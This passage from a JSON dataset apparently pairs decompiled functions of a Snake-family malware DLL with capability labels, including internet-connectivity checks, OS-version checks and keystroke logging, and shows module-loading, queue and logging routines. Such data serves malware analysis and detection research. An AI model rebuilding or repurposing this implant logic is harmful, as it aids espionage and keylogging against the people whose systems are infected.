0)) goto code_r0x200052d3;\n        if (var_4h == -1) {\ncode_r0x200051e1:\n            iVar3 = fcn.20007ba8(&var_30h, 0x10, 0x229);\n            if (iVar3 == 0) goto code_r0x200051fc;\n        }\n        else {\n            iVar3 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 0xb, &var_4h, &var_71h + 1);\n            if (iVar3 == 0) {\n                fcn.20003efc(0xfffffffe, var_60h);\n                goto code_r0x200051e1;\n            }\n        }\n        fcn.20003e6b();\n    }\ncode_r0x200052d3:\n    if (arg_10h != 0) {\n        if (var_10h != 0) {\n            fcn.2000be36();\n        }\n        if (var_8h != 0) {\n            fcn.200081ef();\n        }\n        if (var_ch != 0) {\n            sym.inj_snake_Win32.dll_tm_free();\n        }\n        if (var_14h != 0) {\n            fcn.2000a9d9(0xfffffffe);\n            fcn.2000ae89();\n            fcn.20003e6b();\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 1556
    },
    "2000648c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.2000648c(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t arg_18h_00;\n    uint var_24h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint *ptr;\n    int32_t var_4h;\n    \n    var_4h = 0x21590001;\n    ptr = NULL;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_ch < 100) {\n        *arg_18h = 0;\n        *arg_1ch = 0;\n        iVar3 = 0;\n        do {\n            if (*(iVar3 * 8 + 0x200341a0) == arg_ch) {\n                var_4h = (**(iVar3 * 8 + 0x200341a4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n                break;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 8);\n    }\n    else {\n        if (arg_14h == 0) {\n            puVar2 = NULL;\n        }\n        else {\n            puVar2 = fcn.2000d2da(arg_10h, arg_14h);\n            if (puVar2 == NULL) {\n                return 0x215901f8;\n            }\n        }\n        var_14h = 0;\n        var_4h = sym.inj_snake_Win32.dll_snake_modules_command\n                           (-(in_EAX != 0) & arg_8h, arg_ch, puVar2, &var_10h, &ptr, &var_14h, in_EAX);\n        arg_18h_00 = var_14h;\n        while (puVar2 != NULL) {\n            puVar1 = *puVar2;\n            if (puVar2[4] != puVar2 + 5) {\n                (*_sym.imp.msvcrt.dll_free)(puVar2[4]);\n            }\n            (*_sym.imp.msvcrt.dll_free)(puVar2);\n            puVar2 = puVar1;\n        }\n        if (0x200 < arg_18h_00) {\n            fcn.20001976(0x20047180);\n            if ((*0x20046e1c != NULL) && (*0x20046e20 != NULL)) {\n                iVar3 = (**0x20046e20)(arg_18h_00);\n                var_ch = iVar3 + 4;\n                puVar2 = (*_sym.imp.msvcrt.dll_malloc)(var_ch);\n                if (puVar2 != NULL) {\n                    uVar4 = (*_sym.imp.WS2_32.dll_htonl)(arg_18h_00);\n                    *puVar2 = uVar4;\n                    var_4h = (**0x20046e1c)(puVar2 + 1, &var_ch, ptr, arg_18h_00);\n                    if ((var_4h == 0) && (var_ch < arg_18h_00)) {\n                        var_10h = var_10h | 0x80;\n                        (*_sym.imp.msvcrt.dll_free)(ptr);\n                        arg_18h_00 = var_ch + 4;\n                        ptr = puVar2;\n                    }\n                    else {\n                        (*_sym.imp.msvcrt.dll_free)(puVar2);\n                        var_4h = 0;\n                    }\n                }\n            }\n            fcn.200019c5(0x20047180);\n        }\n        iVar3 = fcn.20007ba8(&var_24h, 0x10, 0x227);\n        if (iVar3 == 0) {\n            iVar3 = fcn.2000d3c1(&var_24h, 0x10, arg_18h_00);\n            *arg_1ch = iVar3 + 1;\n            iVar3 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, iVar3 + 1, 0);\n            *arg_18h = iVar3;\n            if (iVar3 == 0) {\n                *arg_1ch = 0;\n                var_4h = 0x21590004;\n            }\n            else {\n                iVar3 = fcn.2000d3d3(&var_24h, 0x10, iVar3 + 1, ptr, arg_18h_00);\n                *arg_1ch = iVar3 + 1;\n                **arg_18h = var_10h;\n            }\n        }\n        else {\n            var_4h = 0x215901f9;\n        }\n    }\n    (*_sym.imp.msvcrt.dll_free)(ptr);\n    return var_4h;\n}\n",
        "token_count": 1153
    },
    "200070ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200070ea(void)\n\n{\n    fcn.20001551(0x20046c70);\n    *0x20046c88 = (*_sym.imp.msvcrt.dll_calloc)(0x1a0, 0x14);\n    if (*0x20046c88 != 0) {\n        fcn.200012fa(0x20046c68);\n        fcn.20001cfb(0x20046c8c, 0x20006ced, 0);\n        if (*0x200474ac == NULL) {\n            *0x200474ac = fcn.20006683;\n        }\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "20007141": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20007141(int32_t *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    var_4h = 0;\n    var_ch = 0x20034160;\n    var_8h = 0;\n    arg_ch = fcn.2000648c(&var_ch, *arg_8h, arg_8h + 4, arg_8h[3], &var_4h, &var_8h);\n    if (arg_8h[1] == 3) {\n        if (*arg_8h == 1) {\n            if (arg_ch == 0) goto code_r0x200071ad;\n            goto code_r0x2000718c;\n        }\n    }\n    else {\ncode_r0x2000718c:\n        if ((*arg_8h == 1) && (arg_ch == 0x21590202)) goto code_r0x200071ad;\n    }\n    arg_10h = fcn.200066c0(arg_8h[2], arg_ch, var_4h, var_8h);\ncode_r0x200071ad:\n    (**0x20034164)(&var_ch, var_4h, 0);\n    sym.inj_snake_Win32.dll_snake_log(5, arg_ch, arg_10h, *arg_8h, arg_8h[2]);\n    (*_sym.imp.msvcrt.dll_free)(arg_8h);\n    return 0;\n}\n",
        "token_count": 366
    },
    "20007972": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.20007972(uint arg_8h, int32_t arg_ch, uint s2, int32_t arg_14h, uint *arg_18h, uint *arg_1ch, int32_t arg_20h, \n            uint *arg_24h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *arg_10h;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint32_t arg_10h_00;\n    uint arg_18h_00;\n    uint32_t s;\n    uint var_14h;\n    int32_t var_10h;\n    uint ptr;\n    uint *var_4h;\n    \n    ptr = 0;\n    if (((99 < arg_ch) && (*(arg_20h + 8) != '\\x04')) && (uVar2 = fcn.20006aef(&ptr),  uVar2 != 0)) {\n        return uVar2;\n    }\n    uVar1 = *(arg_20h + 8);\n    if (uVar1 == 0) {\ncode_r0x20007b76:\n        arg_18h_00 = *(arg_20h + 4);\n        uVar2 = 0x21590001;\n        arg_10h_00 = 0;\n        arg_ch_00 = 0x21590001;\n        arg_8h_00 = 5;\ncode_r0x20007b85:\n        sym.inj_snake_Win32.dll_snake_log(arg_8h_00, arg_ch_00, arg_10h_00, arg_ch, arg_18h_00);\n        *arg_18h = 0;\n        *arg_1ch = 0;\n    }\n    else {\n        if (uVar1 < 3) {\n            if (arg_24h == NULL) {\n                uVar2 = fcn.2000648c(arg_8h, arg_ch, s2, arg_14h, arg_18h, arg_1ch);\n                sym.inj_snake_Win32.dll_snake_log(5, uVar2, 0, arg_ch, *(arg_20h + 4));\n                goto code_r0x20007b97;\n            }\n        }\n        else if (uVar1 != 3) {\n            if (uVar1 != 4) goto code_r0x20007b76;\n            if (((0x18 < *(arg_20h + 9)) || (0x3b < *(arg_20h + 10))) ||\n               ((*(arg_20h + 0xd) == 0 || (*(arg_20h + 0xb) == '\\0')))) {\n                return 0x21590065;\n            }\n            sub.ntdll.dll_memset(&s, 0, 0x10);\n            s = CONCAT21(CONCAT11(*(arg_20h + 9), *(arg_20h + 10)), *(arg_20h + 0xb));\n            var_14h = *(arg_20h + 0xd);\n            var_10h = arg_ch;\n            iVar3 = sym.inj_snake_Win32.dll_qm_push(0xfffffffe, 6, *(arg_20h + 4), s2, arg_14h, &s);\n            if (iVar3 == 0) {\n                uVar2 = 0;\n                fcn.200012c9(0x20047170);\n            }\n            else {\n                uVar2 = iVar3 + 0x191U | 0x21590000;\n            }\n            arg_18h_00 = *(arg_20h + 4);\n            arg_ch_00 = 0;\n            arg_8h_00 = 7;\n            arg_10h_00 = uVar2;\n            goto code_r0x20007b85;\n        }\n        arg_10h = (*_sym.imp.msvcrt.dll_malloc)(arg_14h + 0x10);\n        if (arg_10h == NULL) {\n            sym.inj_snake_Win32.dll_snake_log(5, 0, 0x21590004, arg_ch, *(arg_20h + 4));\n            return 0x21590004;\n        }\n        *arg_10h = arg_ch;\n        arg_10h[2] = *(arg_20h + 4);\n        arg_10h[1] = *(arg_20h + 8);\n        arg_10h[3] = arg_14h;\n        sub.ntdll.dll_memcpy(arg_10h + 4, s2, arg_14h);\n        if (*(arg_20h + 8) == '\\x03') {\n            sym.inj_snake_Win32.dll_snake_log(0xc, 0, 0, arg_ch, *(arg_20h + 4));\n        }\n        uVar2 = 0;\n        var_4h = arg_24h;\n        if (arg_24h == NULL) {\n            var_4h = &var_10h;\n        }\n        iVar3 = fcn.20001cfb(var_4h, fcn.20007141, arg_10h);\n        if (iVar3 == 0) {\n            if (arg_24h == NULL) {\n                fcn.20001d2f(var_4h);\n            }\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            (*_sym.imp.msvcrt.dll_free)(arg_10h);\n            sym.inj_snake_Win32.dll_snake_log(5, 0, uVar2, arg_ch, *(arg_20h + 4));\n        }\n        *arg_18h = 0;\n        *arg_1ch = 0;\n    }\ncode_r0x20007b97:\n    (*_sym.imp.msvcrt.dll_free)(ptr);\n    return uVar2;\n}\n",
        "token_count": 1328
    },
    "200081ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.200081ef(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x20046cac != 0) {\n        fcn.20013237(0x20046cac, 0);\n        iVar1 = 0x20046c94;\n        do {\n            fcn.20001d55(iVar1, 0);\n            fcn.20001d2f(iVar1);\n            iVar1 = iVar1 + 8;\n        } while (iVar1 < 0x20046cac);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "200089de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200089de(int32_t param_1)\n\n{\n    int32_t arg_ch;\n    \n    fcn.2000899e(*(param_1 + 4), param_1 + 0x114);\n    arg_ch = *(param_1 + 4);\n    if (arg_ch != 0) {\n        if (*(param_1 + 0x118) != 0) {\n            fcn.20011537(*(param_1 + 0x11c), arg_ch, 1);\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "20008c28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20008c28(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    *arg_14h = 3;\n    iVar4 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 4, &var_8h, &var_4h);\n    if (iVar4 != 0) {\n        return iVar4 + 0x191U | 0x21590000;\n    }\n    sub.ntdll.dll_memset(&var_18h, 0, 0x10);\n    var_18h = 7;\n    var_14h = (*_sym.imp.msvcrt.dll_calloc)(7, 8);\n    if (var_14h == NULL) {\ncode_r0x20008c8c:\n        uVar8 = 0x21590004;\n    }\n    else {\n        *var_14h = 1;\n        var_14h[1] = 8;\n        var_14h[2] = 0xe;\n        var_14h[3] = 3;\n        var_14h[4] = 2;\n        var_14h[5] = 7;\n        var_14h[6] = 3;\n        var_14h[7] = 7;\n        var_14h[8] = 4;\n        var_14h[9] = 2;\n        var_14h[10] = 0xf;\n        var_14h[0xb] = 2;\n        var_14h[0xc] = 5;\n        var_14h[0xd] = 2;\n        var_10h = var_8h;\n        var_ch = (*_sym.imp.msvcrt.dll_calloc)(var_8h, 4);\n        iVar4 = 0;\n        if (var_ch == 0) {\n            uVar8 = 0x21590004;\n            goto code_r0x20008ed3;\n        }\n        arg_14h = NULL;\n        if (var_10h != 0) {\n            do {\n                iVar6 = arg_14h * 4;\n                uVar5 = (*_sym.imp.msvcrt.dll_calloc)(var_18h, 0x10);\n                *(iVar6 + var_ch) = uVar5;\n                if (*(var_ch + iVar6) == 0) goto code_r0x20008c8c;\n                iVar1 = *(var_ch + iVar6);\n                *(iVar1 + 4) = iVar1 + 8;\n                **(iVar6 + var_ch) = 4;\n                **(*(iVar6 + var_ch) + 4) = *(iVar4 + 0x20 + var_4h);\n                *(*(iVar6 + var_ch) + 0x14) = *(iVar6 + var_ch) + 0x18;\n                *(*(iVar6 + var_ch) + 0x10) = 4;\n                **(*(iVar6 + var_ch) + 0x14) = *(iVar4 + 0x10 + var_4h);\n                *(*(iVar6 + var_ch) + 0x24) = *(iVar6 + var_ch) + 0x28;\n                *(*(iVar6 + var_ch) + 0x20) = 4;\n                **(*(iVar6 + var_ch) + 0x24) = *(iVar4 + 0x18 + var_4h);\n                *(*(iVar6 + var_ch) + 0x34) = *(iVar6 + var_ch) + 0x38;\n                *(*(iVar6 + var_ch) + 0x30) = 4;\n                **(*(iVar6 + var_ch) + 0x34) = *(iVar4 + 0x14 + var_4h);\n                uVar8 = *(iVar4 + 0xc + var_4h);\n                *(*(iVar6 + var_ch) + 0x44) = *(iVar6 + var_ch) + 0x48;\n                *(*(iVar6 + var_ch) + 0x40) = 4;\n                puVar2 = *(*(iVar6 + var_ch) + 0x44);\n                if ((uVar8 & 0x80000000) == 0) {\n                    *puVar2 = *(iVar4 + 0xc + var_4h);\n                }\n                else {\n                    *puVar2 = 0;\n                }\n                *(*(iVar6 + var_ch) + 0x54) = *(iVar6 + var_ch) + 0x58;\n                *(*(iVar6 + var_ch) + 0x50) = 4;\n                **(*(iVar6 + var_ch) + 0x54) = *(iVar4 + 0x1c + var_4h);\n                uVar8 = *(iVar4 + 0xc + var_4h);\n                *(*(iVar6 + var_ch) + 100) = *(iVar6 + var_ch) + 0x68;\n                *(*(iVar6 + var_ch) + 0x60) = 4;\n                if ((uVar8 & 0x80000000) == 0) {\n                    **(*(iVar6 + var_ch) + 100) = 0;\n                }\n                else {\n                    **(*(iVar6 + var_ch) + 100) = *(iVar4 + 0xc + var_4h) & 0x7fffffff;\n                }\n                arg_14h = arg_14h + 1;\n                iVar4 = iVar4 + 0x40;\n            } while (arg_14h < var_10h);\n        }\n        uVar8 = sym.inj_snake_Win32.dll_code_result_tbl(&var_18h, arg_18h, arg_1ch);\n    }\n    uVar7 = 0;\n    if ((var_ch != 0) && (var_10h != 0)) {\n        do {\n            (*_sym.imp.msvcrt.dll_free)(*(var_ch + uVar7 * 4));\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < var_10h);\n    }\ncode_r0x20008ed3:\n    pcVar3 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_14h);\n    (*pcVar3)(var_ch);\n    (*pcVar3)(var_4h);\n    return uVar8;\n}\n",
        "token_count": 1561
    },
    "20008f29": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20008f29(uint arg_8h, int32_t s)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_18h;\n    uint arg_1ch;\n    uint s2;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0x100;\n    var_8h = sym.inj_snake_Win32.dll_local_queue_read(7, arg_8h, &s2, 0x100, &var_4h, 0);\n    sub.ntdll.dll_memset(&var_18h, 0, 0x10);\n    iVar4 = s;\n    arg_1ch = 1;\n    arg_18h = &var_18h;\n    var_14h = 1;\n    iVar1 = sub.ntdll.dll_strlen(s);\n    iVar1 = sym.inj_snake_Win32.dll_local_queue_write(7, arg_8h, iVar4, iVar1 + 1, arg_18h, arg_1ch);\n    if (iVar1 != 0) {\n        return;\n    }\n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 7, &arg_8h, &var_58h);\n    if (iVar1 != 0) {\n        return;\n    }\n    sym.inj_snake_Win32.dll_qm_set_param(0xfffffffe, 7, var_54h, 0, var_48h + 1);\n    if (var_8h != 0) {\n        return;\n    }\n    iVar1 = (*_sym.imp.ntdll.dll_strrchr)(&s2, 0x3a);\n    if (iVar1 != 0) {\n        uVar2 = iVar1 - &s2;\n        uVar3 = sub.ntdll.dll_strlen(iVar4);\n        if ((((uVar2 < uVar3) && (*(uVar2 + iVar4) == ':')) && (uVar2 != 0)) &&\n           (iVar4 = sub.ntdll.dll_memcmp(iVar4, &s2, uVar2 - 1),  iVar4 == 0)) {\n            var_44h = var_44h + 1;\n        }\n        else {\n            var_44h = 1;\n        }\n        sym.inj_snake_Win32.dll_qm_set_param(0xfffffffe, 7, var_54h, 1, var_44h);\n        return;\n    }\n    return;\n}\n",
        "token_count": 626
    },
    "20009063": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.20009063(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_11ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    *arg_14h = 3;\n    iVar2 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 7, &var_18h, &var_14h);\n    if (iVar2 != 0) {\n        return iVar2 + 0x191U | 0x21590000;\n    }\n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    pcVar1 = _sym.imp.msvcrt.dll_calloc;\n    var_10h = 6;\n    var_8h = var_18h;\n    var_ch = (*_sym.imp.msvcrt.dll_calloc)(6, 8);\n    if (var_ch == NULL) {\ncode_r0x200090d0:\n        uVar7 = 0x21590004;\n    }\n    else {\n        *var_ch = 5;\n        var_ch[1] = 2;\n        var_ch[2] = 0x1c;\n        var_ch[3] = 200;\n        var_ch[4] = 0x1d;\n        var_ch[5] = 2;\n        var_ch[6] = 0x1e;\n        var_ch[7] = 2;\n        var_ch[8] = 1;\n        var_ch[9] = 8;\n        var_ch[10] = 0x5f;\n        var_ch[0xb] = 2;\n        var_4h = (*pcVar1)(var_8h, 4);\n        iVar2 = 0;\n        if (var_4h == 0) {\n            uVar7 = 0x21590004;\n            goto code_r0x20009332;\n        }\n        arg_14h = NULL;\n        if (var_18h != 0) {\n            do {\n                iVar3 = sym.inj_snake_Win32.dll_local_queue_read\n                                  (7, *(iVar2 + 4 + var_14h), &var_11ch, 0x100, &var_1ch, 1);\n                if (iVar3 != 0) {\n                    var_11ch._0_1_ = 0;\n                }\n                iVar5 = arg_14h * 4;\n                iVar3 = sub.ntdll.dll_strlen(&var_11ch);\n                uVar4 = (*_sym.imp.msvcrt.dll_malloc)(iVar3 + 1 + var_10h * 0x10);\n                *(iVar5 + var_4h) = uVar4;\n                if (*(var_4h + iVar5) == 0) goto code_r0x200090d0;\n                sub.ntdll.dll_memset(*(var_4h + iVar5), 0, var_10h << 4);\n                *(*(iVar5 + var_4h) + 4) = *(iVar5 + var_4h) + 8;\n                **(iVar5 + var_4h) = 4;\n                **(*(iVar5 + var_4h) + 4) = *(iVar2 + 0xc + var_14h);\n                sub.ntdll.dll_strcpy(var_10h * 0x10 + *(iVar5 + var_4h), &var_11ch);\n                *(*(iVar5 + var_4h) + 0x14) = var_10h * 0x10 + *(iVar5 + var_4h);\n                iVar3 = sub.ntdll.dll_strlen(&var_11ch);\n                *(*(iVar5 + var_4h) + 0x10) = iVar3 + 1;\n                *(*(iVar5 + var_4h) + 0x24) = *(iVar5 + var_4h) + 0x28;\n                *(*(iVar5 + var_4h) + 0x20) = 4;\n                **(*(iVar5 + var_4h) + 0x24) = *(iVar2 + 0x10 + var_14h);\n                *(*(iVar5 + var_4h) + 0x34) = *(iVar5 + var_4h) + 0x38;\n                *(*(iVar5 + var_4h) + 0x30) = 4;\n                **(*(iVar5 + var_4h) + 0x34) = *(iVar2 + 0x14 + var_14h);\n                *(*(iVar5 + var_4h) + 0x44) = *(iVar5 + var_4h) + 0x48;\n                *(*(iVar5 + var_4h) + 0x40) = 4;\n                **(*(iVar5 + var_4h) + 0x44) = *(iVar2 + 0x28 + var_14h);\n                arg_14h = arg_14h + 1;\n                *(*(iVar5 + var_4h) + 0x54) = *(iVar5 + var_4h) + 0x58;\n                *(*(iVar5 + var_4h) + 0x50) = 4;\n                **(*(iVar5 + var_4h) + 0x54) = *(iVar2 + 0x18 + var_14h);\n                iVar2 = iVar2 + 0x40;\n            } while (arg_14h < var_18h);\n        }\n        uVar7 = sym.inj_snake_Win32.dll_code_result_tbl(&var_10h, arg_18h, arg_1ch);\n    }\n    uVar6 = 0;\n    if (var_4h != 0) {\n        if (var_8h != 0) {\n            do {\n                (*_sym.imp.msvcrt.dll_free)(*(var_4h + uVar6 * 4));\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < var_8h);\n        }\n        (*_sym.imp.msvcrt.dll_free)(var_4h);\n    }\ncode_r0x20009332:\n    (*_sym.imp.msvcrt.dll_free)(var_ch);\n    sym.inj_snake_Win32.dll_qm_free(var_14h);\n    return uVar7;\n}\n",
        "token_count": 1545
    },
    "2000946a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000946a(char *src, int32_t arg_ch)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    int32_t var_8h;\n    code *var_4h;\n    \n    fcn.20001976(0x20046ddc);\n    for (puVar3 = *0x20046e14; puVar3 != NULL; puVar3 = *puVar3) {\n        if (puVar3[1] != *0x20046e18) {\n            fcn.2000899e(puVar3[1], puVar3 + 0x45);\n        }\n    }\n    fcn.200019c5(0x20046ddc);\n    fcn.2000899e(*0x20046e6c, 0x20046e70);\n    arg_8h = (*_sym.imp.msvcrt.dll_malloc)(300);\n    if (arg_8h == NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x2000960d:\n        if (iVar1 == 0) goto code_r0x20009620;\n    }\n    else {\n        sub.ntdll.dll_memset(arg_8h, 0, 300);\n        if (arg_ch == 0) {\n            if (*src == '&') {\n                iVar1 = fcn.20008ae0(src, arg_8h);\n            }\n            else {\n                iVar1 = fcn.20008a53(arg_8h, src);\n            }\n        }\n        else {\n            iVar1 = fcn.20008a20(arg_8h, arg_ch, src, src);\n        }\n        if ((iVar1 == 0) && (iVar1 = fcn.20008954(arg_8h, &var_ch),  iVar1 == 0)) {\n            (*_sym.imp.ntdll.dll_strncpy)(arg_8h + 2, src, 0x104);\n            *(arg_8h + 0x10b) = 0;\n            fcn.20001976(0x20046ddc);\n            puVar3 = *0x20046e14;\n            while (((puVar3 != NULL && (puVar3[1] != arg_8h[1])) &&\n                   (iVar1 = (*_sym.imp.ntdll.dll__stricmp)(puVar3 + 2, arg_8h + 2),  iVar1 != 0))) {\n                puVar3 = *puVar3;\n            }\n            fcn.200019c5(0x20046ddc);\n            if (puVar3 == NULL) {\n                iVar1 = fcn.2000896f(arg_8h, \"ModuleStart\", &var_4h);\n                if (iVar1 == 0) {\n                    fcn.2000896f(arg_8h, \"ModuleCommand\", arg_8h + 0x43);\n                    fcn.2000896f(arg_8h, \"ModuleStop\", arg_8h + 0x44);\n                    iVar1 = (*var_4h)(*0x20046e14);\n                    if (iVar1 == 0) {\n                        fcn.20001a1f(0x20046ddc);\n                        **0x20046e10 = arg_8h;\n                        *0x20046e10 = arg_8h;\n                        fcn.20001a68(0x20046ddc);\n                        goto code_r0x2000960d;\n                    }\n                }\n            }\n            else {\n                iVar1 = 0x215901fc;\n            }\n        }\n    }\n    fcn.200089de(arg_8h);\n    (*_sym.imp.msvcrt.dll_free)(arg_8h);\ncode_r0x20009620:\n    fcn.20001976(0x20046ddc);\n    for (puVar3 = *0x20046e14; puVar3 != NULL; puVar3 = *puVar3) {\n        if (puVar3[1] != *0x20046e18) {\n            fcn.200089b0(puVar3[1], puVar3 + 0x45);\n        }\n    }\n    fcn.200019c5(0x20046ddc);\n    iVar2 = fcn.200089c7(*0x20046e6c, &var_8h);\n    if ((iVar2 != 0) || (var_8h == 1)) {\n        fcn.200089b0(*0x20046e6c, 0x20046e70);\n    }\n    return iVar1;\n}\n",
        "token_count": 1046
    },
    "20009cdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20009cdc(int32_t *arg_8h, uint noname_1, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            int32_t **arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t **ppiVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_20h == NULL) {\n        iVar1 = 0x21590064;\n    }\n    else if ((arg_14h == 0) || ((arg_14h & 3) != 0)) {\n        iVar1 = 0x215901f8;\n    }\n    else {\n        piVar4 = arg_14h >> 2;\n        iVar1 = piVar4 * 0xc + 0x10;\n        ppiVar2 = (*_sym.imp.msvcrt.dll_malloc)(iVar1);\n        if (ppiVar2 == NULL) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memset(ppiVar2, 0, iVar1);\n            piVar5 = NULL;\n            ppiVar2[3] = piVar4;\n            ppiVar2[2] = arg_8h;\n            if (piVar4 != NULL) {\n                arg_20h = ppiVar2 + 4;\n                do {\n                    piVar3 = (*_sym.imp.WS2_32.dll_ntohl)(*(arg_10h + piVar5 * 4));\n                    piVar5 = piVar5 + 1;\n                    *arg_20h = piVar3;\n                    arg_20h = arg_20h + 3;\n                } while (piVar5 < piVar4);\n            }\n            fcn.20001567(0x20046e28);\n            if (*0x20046e24 != NULL) {\n                (*0x20046e24)[1] = ppiVar2;\n            }\n            *ppiVar2 